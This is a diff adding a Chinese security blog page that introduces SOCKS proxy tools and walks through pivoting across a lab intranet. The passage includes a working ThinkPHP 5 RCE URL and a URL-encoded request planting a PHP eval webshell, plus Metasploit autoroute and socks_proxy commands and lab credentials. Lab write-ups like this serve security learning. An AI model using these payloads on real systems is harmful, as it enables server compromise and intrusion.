@@ -1,0 +1,797 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="August Rosenberg">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="socks简介   SOCKS是一种网络传输协议，主要用于客户端与外网服务器之间通讯的中间传递。  根据OSI模型，SOCKS是会话层的协议，位于表示层与传输层之间。 使用TCP协议传输数据，因而不提供如传递 ICMP 信息之类的网络层网关服务  由于socks是会话层的代理，不提供ICMP的代理，所以ping 是代理不了的 socks代理  被代理端与代理服务器通过 SOCKS4&#x2F;5">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Socks代理">
+<meta property="og:url" content="https://tsy244.github.io/2024/01/25/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/index.html">
+<meta property="og:site_name" content="AU9U5T">
+<meta property="og:description" content="socks简介   SOCKS是一种网络传输协议，主要用于客户端与外网服务器之间通讯的中间传递。  根据OSI模型，SOCKS是会话层的协议，位于表示层与传输层之间。 使用TCP协议传输数据，因而不提供如传递 ICMP 信息之类的网络层网关服务  由于socks是会话层的代理，不提供ICMP的代理，所以ping 是代理不了的 socks代理  被代理端与代理服务器通过 SOCKS4&#x2F;5">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125095256134.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125105930204.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125110018111.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125110046964.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125110117028.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125110348901.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125110621769.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125110747173.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125120712888.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125120817703.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125121218791.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125121509645.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125134417585.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125160830291.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125160913460.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125162926936.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125161402430.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125162456033.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125162806959.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125163200850.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125163454625.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125165404549.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125170233509.png">
+<meta property="article:published_time" content="2024-01-25T01:35:03.000Z">
+<meta property="article:modified_time" content="2024-01-25T09:06:47.143Z">
+<meta property="article:author" content="August Rosenberg">
+<meta property="article:tag" content="渗透">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125095256134.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>Socks代理 - AU9U5T</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"tsy244.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":"G-BL1W5LRRDJ","gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>AU9U5T&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Socks代理"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        August Rosenberg
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-01-25 09:35" pubdate>
+          January 25, 2024 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.8k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          16 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Socks代理</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="socks简介"><a href="#socks简介" class="headerlink" title="socks简介"></a>socks简介</h1><blockquote>
+<p>  SOCKS是一种网络传输协议，主要用于客户端与外网服务器之间通讯的中间传递。  根据OSI模型，SOCKS是会话层的协议，位于表示层与传输层之间。 使用TCP协议传输数据，因而不提供如传递 ICMP 信息之类的网络层网关服务</p>
+</blockquote>
+<p>由于socks是会话层的代理，不提供ICMP的代理，所以ping 是代理不了的</p>
+<h1 id="socks代理"><a href="#socks代理" class="headerlink" title="socks代理"></a>socks代理</h1><blockquote>
+<ol>
+<li>被代理端与代理服务器通过 SOCKS4&#x2F;5 代理协议进行通讯；</li>
+<li>SOCKS4：是对HTTP代理协议的加强，它不仅代理HTTP协议，而是对所有向外的连接进行代理，没有  协议限制；  </li>
+<li>SOCKS4a：SOCKS4协议的简单扩展，允许客户端对无法解析域名的目的主机进行访问  </li>
+<li>SOCKS5：SOCKS5比SOCKS4a多了身份验证、IPv6、UDP支持。创建与SOCKS5服务器的TCP连接后  客户端需要先发送请求来确认协议版本及认证方式</li>
+</ol>
+</blockquote>
+<h2 id="使用socks代理"><a href="#使用socks代理" class="headerlink" title="使用socks代理"></a>使用socks代理</h2><blockquote>
+<ol>
+<li>SOCKS服务器的IP地址  </li>
+<li>SOCKS服务所在端口  </li>
+<li>SOCKS服务是否需要身份验证</li>
+</ol>
+</blockquote>
+<h2 id="相关工具"><a href="#相关工具" class="headerlink" title="相关工具"></a>相关工具</h2><h3 id="EarthWorm"><a href="#EarthWorm" class="headerlink" title="EarthWorm"></a>EarthWorm</h3><blockquote>
+<p>  <a target="_blank" rel="noopener" href="http://rootkiter.com/EarthWorm/">http://rootkiter.com/EarthWorm/</a>  </p>
+</blockquote>
+<blockquote>
+<p>  EW 是一套便携式的网络穿透工具，具有 SOCKS v5 服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透。</p>
+</blockquote>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125095256134.png" srcset="/img/loading.gif" lazyload alt="image-20240125095256134"></p>
+<p>这个图就是渗透测试的路径，我们的目的就是需要达到受限区域</p>
+<h3 id="FRP"><a href="#FRP" class="headerlink" title="FRP"></a>FRP</h3><blockquote>
+<p>  <a target="_blank" rel="noopener" href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a>  </p>
+</blockquote>
+<p>  FRP 是一个可用于内网穿透的高性能的反向代理应用  </p>
+<h3 id="ProxyChains"><a href="#ProxyChains" class="headerlink" title="ProxyChains"></a>ProxyChains</h3><blockquote>
+<p>  <a target="_blank" rel="noopener" href="http://proxychains.sourceforge.net/">http://proxychains.sourceforge.net/</a>  </p>
+</blockquote>
+<p>这个工具也是在渗透中比较常用的</p>
+<h3 id="Proxiﬁer"><a href="#Proxiﬁer" class="headerlink" title="Proxiﬁer"></a>Proxiﬁer</h3><blockquote>
+<p>  <a target="_blank" rel="noopener" href="https://www.proxifier.com/">https://www.proxiﬁer.com/</a>  </p>
+</blockquote>
+<p>  Proxifier 是一个程序，它允许不支持通过代理服务器工作的网络应用程序通过 SOCKS 或 HTTPS代理或代理服务器链进行操作。</p>
+<h3 id="Stowaway"><a href="#Stowaway" class="headerlink" title="Stowaway"></a>Stowaway</h3><blockquote>
+<p>  用户可使用此程序将外部流量通过多个节点代理至内网，突破内网访问限制，构造树状节点网络，并  轻松实现管理功能  </p>
+</blockquote>
+<h1 id="一个三层内网的渗透过程"><a href="#一个三层内网的渗透过程" class="headerlink" title="一个三层内网的渗透过程"></a>一个三层内网的渗透过程</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>由于教学我们知道了他的ip</p>
+<blockquote>
+<p>192.168.79.140</p>
+</blockquote>
+<p>然后尝试扫描端口</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125105930204.png" srcset="/img/loading.gif" lazyload alt="image-20240125105930204"></p>
+<p>发现80端口，尝试目录扫描</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125110018111.png" srcset="/img/loading.gif" lazyload alt="image-20240125110018111"></p>
+<p>一个一个访问</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125110046964.png" srcset="/img/loading.gif" lazyload alt="image-20240125110046964"></p>
+<p>一个宝塔的欢迎页面</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125110117028.png" srcset="/img/loading.gif" lazyload alt="image-20240125110117028"></p>
+<p>发现thinkphp</p>
+<h2 id="Web渗透"><a href="#Web渗透" class="headerlink" title="Web渗透"></a>Web渗透</h2><h3 id="thinkphp-rce"><a href="#thinkphp-rce" class="headerlink" title="thinkphp rce"></a>thinkphp rce</h3><p>搜索相关漏洞</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44862511/article/details/132132998">thinkphp 5-rce版本漏洞复现(超详细版)_thinkphp 漏洞扫描-CSDN博客</a></p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://192.168.79.140/public/index.php?s=index/%5Cthink%5Capp/invokefunction&function=phpinfo&vars%5B0%5D=100">http://192.168.79.140/public/index.php?s=index/\think\app/invokefunction&amp;function=phpinfo&amp;vars[0]=100</a></p>
+</blockquote>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125110348901.png" srcset="/img/loading.gif" lazyload alt="image-20240125110348901"></p>
+<p>发现rce漏洞</p>
+<p>写入webshell</p>
+<p>写入经过url编码的一句话木马</p>
+<blockquote>
+<p>&#x2F;public&#x2F;index.php?s&#x3D;&#x2F;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;file_put_contents&amp;vars[1][]&#x3D;shell.php&amp;vars[1][]&#x3D;%3c%3f%70%68%70%20%40%65%76%61%6c%28%24%5f%50%4f%53%54%5b%27%63%6d%64%27%5d%29%3b%3f%3e</p>
+</blockquote>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125110621769.png" srcset="/img/loading.gif" lazyload alt="image-20240125110621769"></p>
+<p>连接</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125110747173.png" srcset="/img/loading.gif" lazyload alt="image-20240125110747173"></p>
+<h3 id="上线msf"><a href="#上线msf" class="headerlink" title="上线msf"></a>上线msf</h3><p>首先看一下是什么平台</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125120712888.png" srcset="/img/loading.gif" lazyload alt="image-20240125120712888"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125120817703.png" srcset="/img/loading.gif" lazyload alt="image-20240125120817703"></p>
+<p>生成payload</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125121218791.png" srcset="/img/loading.gif" lazyload alt="image-20240125121218791"></p>
+<p>上传到linux</p>
+<p>获取session</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125121509645.png" srcset="/img/loading.gif" lazyload alt="image-20240125121509645"></p>
+<p>搭建代理</p>
+<p>进入session</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">run</span> autoroute -s 192.168.22.1/24<br><span class="hljs-comment"># 看是否有路由</span><br><span class="hljs-built_in">run</span> autoroute -p<br>bg<br></code></pre></td></tr></table></figure>
+
+<p>开启代理</p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gauss"> <span class="hljs-keyword">use</span> socks_proxy<br><span class="hljs-keyword">run</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125134417585.png" srcset="/img/loading.gif" lazyload alt="image-20240125134417585"></p>
+<p>成功代理</p>
+<p>由于会产生大量的连接，所以会出现session掉线的情况，需要重新上线</p>
+<p>尝试存活主机探测</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125160830291.png" srcset="/img/loading.gif" lazyload alt="image-20240125160830291"></p>
+<p>不给我探测，烦人捏</p>
+<h3 id="bash反弹一个shell"><a href="#bash反弹一个shell" class="headerlink" title="bash反弹一个shell"></a>bash反弹一个shell</h3><p>上传fscan 进行存活主机探测</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125160913460.png" srcset="/img/loading.gif" lazyload alt="image-20240125160913460"></p>
+<p>还发现了ssh 弱密码</p>
+<p>假装没发现，这个应该是用于靶场建设的</p>
+<p>发现了存活主机</p>
+<p>但是先测试代理</p>
+<p>测试代理</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125162926936.png" srcset="/img/loading.gif" lazyload alt="image-20240125162926936"></p>
+<p>好好好,sql注入是吧，先放一下</p>
+<p>发现192.168.22.22开放了80端口，对其进行扫描</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125161402430.png" srcset="/img/loading.gif" lazyload alt="image-20240125161402430"></p>
+<p>发现一个</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125162456033.png" srcset="/img/loading.gif" lazyload alt="image-20240125162456033"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125162806959.png" srcset="/img/loading.gif" lazyload alt="image-20240125162806959"></p>
+<p>尝试Sql注入</p>
+<p>直接使用sqlmap</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125163200850.png" srcset="/img/loading.gif" lazyload alt="image-20240125163200850"></p>
+<p>使用钱前面提到的</p>
+<p> <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125163454625.png" srcset="/img/loading.gif" lazyload alt="image-20240125163454625"></p>
+<p>隧道炸了转手注</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125165404549.png" srcset="/img/loading.gif" lazyload alt="image-20240125165404549"></p>
+<p>得到了</p>
+<p>账号：</p>
+<blockquote>
+<p>admin  123qwe</p>
+</blockquote>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240125170233509.png" srcset="/img/loading.gif" lazyload alt="image-20240125170233509"></p>
+<p>然后通过收集到的信息，进行模板注入，写入sehll，上传正向payload</p>
+<p>然后等待连接，连接过来了</p>
+<p>….后面的就有时间在弄吧，这个代理效率太低了</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%B8%97%E9%80%8F/">#渗透</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Socks代理</div>
+      <div>https://tsy244.github.io/2024/01/25/渗透/Socks代理/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>August Rosenberg</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>January 25, 2024</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/01/23/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/WEB/total/" title="total">
+                        <span class="hidden-mobile">total</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://github.com/TSY244?tab=repositories" target="_blank" rel="nofollow noopener"><span>github</span></a> <i class="iconfont icon-love"></i> <a href="https://august244.github.io/" target="_blank" rel="nofollow noopener"><span>随笔</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        Views: 
+        <span id="busuanzi_value_site_pv"></span>
+        
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        Visitors: 
+        <span id="busuanzi_value_site_uv"></span>
+        
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
